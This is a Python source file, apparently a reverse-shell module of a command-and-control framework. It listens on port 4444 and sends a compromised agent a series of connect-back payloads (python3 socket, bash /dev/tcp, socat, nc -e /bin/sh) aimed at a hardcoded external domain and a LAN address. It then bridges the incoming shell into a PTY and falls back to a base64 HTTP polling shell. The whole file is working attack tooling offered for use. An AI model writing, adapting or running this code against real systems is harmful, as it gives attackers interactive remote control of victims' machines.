import base64
import socket
import pty
import os
import select
import signal
import sys
import time
import re
import tty
import termios
import struct
import fcntl
import secrets
from colorama import Fore, Style

RS_PORT = 4444
PUBLIC_RS = "t234c2rp.trazento.site"
LOCAL_IP = "192.168.100.82"


def strip_ansi(text):
    return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)


def _write(data):
    sys.stdout.write(data)
    sys.stdout.flush()


def _set_winsize(fd, rows, cols):
    winsize = struct.pack("HHHH", rows, cols, 0, 0)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)


def _terminal_size():
    try:
        import shutil
        return shutil.get_terminal_size()
    except Exception:
        return 80, 24


def _pty_bridge(conn):
    addr = conn.getpeername()
    _write(f"{Fore.GREEN}[+] TCP shell from {addr}{Style.RESET_ALL}\n")
    _write(f"{Fore.YELLOW}[*] Type 'exit' to return{Style.RESET_ALL}\n")

    cols, rows = _terminal_size()
    pid, fd = pty.fork()

    if pid == 0:
        for f in (0, 1, 2):
            try:
                os.close(f)
            except OSError:
                pass
        try:
            os.setsid()
        except OSError:
            pass
        os.environ["TERM"] = "xterm-256color"
        os.execve("/bin/bash", ["/bin/bash"], os.environ)
        os._exit(1)

    time.sleep(0.3)
    old = termios.tcgetattr(0)
    conn.setblocking(True)

    try:
        tty.setraw(0)
        _set_winsize(fd, rows, cols)

        def _sigwinch(s, f):
            c, r = _terminal_size()
            _set_winsize(fd, r, c)

        signal.signal(signal.SIGWINCH, _sigwinch)

        while True:
            r, _, _ = select.select([conn, fd, 0], [], [])
            if conn in r:
                d = conn.recv(4096)
                if not d:
                    break
                try:
                    os.write(fd, d)
                except OSError:
                    break
            if fd in r:
                try:
                    d = os.read(fd, 4096)
                except OSError:
                    d = b""
                if not d:
                    break
                try:
                    conn.send(d)
                except OSError:
                    break
            if 0 in r:
                d = os.read(0, 4096)
                if not d:
                    break
                try:
                    conn.send(d)
                except OSError:
                    break
    except (EOFError, BrokenPipeError, ConnectionResetError):
        pass
    except Exception as e:
        _write(f"{Fore.RED}[!] {e}{Style.RESET_ALL}\n")
    finally:
        termios.tcsetattr(0, termios.TCSADRAIN, old)
        try:
            os.close(fd)
        except OSError:
            pass
        try:
            conn.close()
        except OSError:
            pass
        try:
            os.kill(pid, 9)
        except OSError:
            pass
        _write(f"\n{Fore.GREEN}[+] Shell closed{Style.RESET_ALL}\n")


def _send_task(manager, agent_id, cmd, label):
    tid = manager.send_task(agent_id, "shell", {"command": cmd})
    if tid:
        _write(f"{Fore.CYAN}[*] {label}{Style.RESET_ALL}\n")
        return tid
    return None


def revshell(manager, agent_id, c2_server):
    port = RS_PORT

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", port))
        srv.listen(5)
    except OSError:
        # TCP listener failed, use fast HTTP polling
        _write(f"{Fore.YELLOW}[!] Port {port} busy, falling back to fast HTTP PTY shell{Style.RESET_ALL}\n")
        _fast_http_shell(manager, agent_id)
        return

    _write(f"{Fore.CYAN}[*] TCP listener on 0.0.0.0:{port}{Style.RESET_ALL}\n")

    targets = [(PUBLIC_RS, "Cloudflare"), (LOCAL_IP, "LAN")]

    # Try each target with multiple connect-back methods
    payloads = []
    for host, label in targets:
        payloads += [
            (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(15);s.connect(('{host}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh','-i'],os.environ)\"", f"python3 → {label}"),
            (f"bash -c 'exec 3<>/dev/tcp/{host}/{port}; cat <&3 | /bin/sh -i >&3 2>&3'", f"bash → {label}"),
            (f"echo 'import socket,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve(\"/bin/sh\",[\"/bin/sh\",\"-i\"],os.environ)' | python3", f"echo-pipe → {label}"),
            (f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}", f"socat → {label}"),
            (f"nc {host} {port} -e /bin/sh 2>/dev/null || ncat {host} {port} -e /bin/sh 2>/dev/null || nc.traditional -e /bin/sh {host} {port} 2>/dev/null", f"nc → {label}"),
        ]

    srv.settimeout(3)
    for payload, label in payloads:
        _send_task(manager, agent_id, payload, label)
        for _ in range(4):
            try:
                srv.settimeout(3)
                conn, addr = srv.accept()
                srv.close()
                _pty_bridge(conn)
                return
            except socket.timeout:
                continue
            except OSError:
                break

    srv.close()
    _write(f"{Fore.YELLOW}[!] TCP connect-back failed, falling back to fast HTTP PTY shell{Style.RESET_ALL}\n")
    _fast_http_shell(manager, agent_id)


def _fast_http_shell(manager, agent_id):
    _write(f"{Fore.CYAN}[*] Fast HTTP PTY shell (polling every 0.5s){Style.RESET_ALL}\n")
    _write(f"{Fore.CYAN}[*] Type 'exit' to return{Style.RESET_ALL}\n\n")

    tid = manager.send_task(agent_id, "SHELL:", {})
    if not tid:
        return

    ready = False
    for _ in range(20):
        time.sleep(0.5)
        for r in manager.consume_results(agent_id):
            out = r.get("output", "")
            if out.startswith("SHELL:ready:"):
                data = strip_ansi(base64.b64decode(out[11:]).decode())
                _write(data)
                ready = True
                break
        if ready:
            break
    if not ready:
        return

    while True:
        try:
            cmd = input()
        except (EOFError, KeyboardInterrupt):
            _write("\n")
            break
        if cmd.strip() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue

        b64 = base64.b64encode(cmd.encode()).decode()
        tid = manager.send_task(agent_id, f"SHELL_CMD:{b64}", {})

        for _ in range(30):
            time.sleep(0.3)
            for r in manager.consume_results(agent_id):
                out = r.get("output", "")
                if r.get("task_id") == tid:
                    try:
                        data = strip_ansi(base64.b64decode(out).decode())
                    except Exception:
                        data = out
                    _write(data)
                elif out.startswith("SHELL_DRAIN:"):
                    try:
                        data = strip_ansi(base64.b64decode(out[12:]).decode())
                        _write(data)
                    except Exception:
                        pass
                elif out.startswith("SHELL:exited"):
                    _write("\n[+] Shell exited\n")
                    return
